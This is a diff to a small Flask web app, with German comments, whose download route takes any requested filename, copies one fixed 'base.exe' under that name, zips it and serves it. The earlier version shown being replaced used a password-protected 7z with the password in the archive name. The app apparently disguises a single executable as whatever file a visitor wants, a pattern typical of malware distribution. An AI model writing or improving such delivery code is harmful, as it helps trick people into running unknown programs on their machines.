@@ -4,7 +4,7 @@ import os
 import random
 import threading
 import time
-import py7zr
+import zipfile
 
 app = Flask(__name__)
 CORS(app)
@@ -23,29 +23,36 @@ def remove_later(path, delay=300):
 
 @app.route("/download/<path:filename>")
 def download(filename):
-    password = str(random.randint(1000, 9999))
+    # Zufällige ID generieren
+    file_id = str(random.randint(1000, 9999))
     filename = filename.replace("+", " ")
     base_name = os.path.splitext(os.path.basename(filename))[0]
 
-    # Passwort direkt in den Dateinamen einbauen
-    archive_name = f"{base_name}_PASSWORD_{password}.7z"
+    # Archivname mit ID am Ende
+    archive_name = f"{base_name}_ID_{file_id}.zip"
 
     exe_source = "base.exe"
     exe_target = f"{base_name}.exe"
 
     if os.path.exists(exe_source):
+        # Kopie der exe-Datei erstellen
         with open(exe_source, "rb") as src, open(exe_target, "wb") as dst:
             dst.write(src.read())
 
-        with py7zr.SevenZipFile(archive_name, 'w', password=password) as archive:
+        # ZIP-Archiv ohne Passwort erstellen
+        with zipfile.ZipFile(archive_name, 'w', zipfile.ZIP_DEFLATED) as archive:
             archive.write(exe_target)
 
+        # temporäre Datei entfernen
         os.remove(exe_target)
-        remove_later(archive_name, delay=300)  # löscht Archiv nach 5 Minuten
+
+        # automatische Löschung nach 5 Minuten
+        remove_later(archive_name, delay=300)
+    else:
+        return jsonify({"error": "base.exe not found"}), 404
 
     return jsonify({
         "download_url": f"/getfile/{archive_name}",
-        "password": password,
         "archive_name": archive_name
     })
 
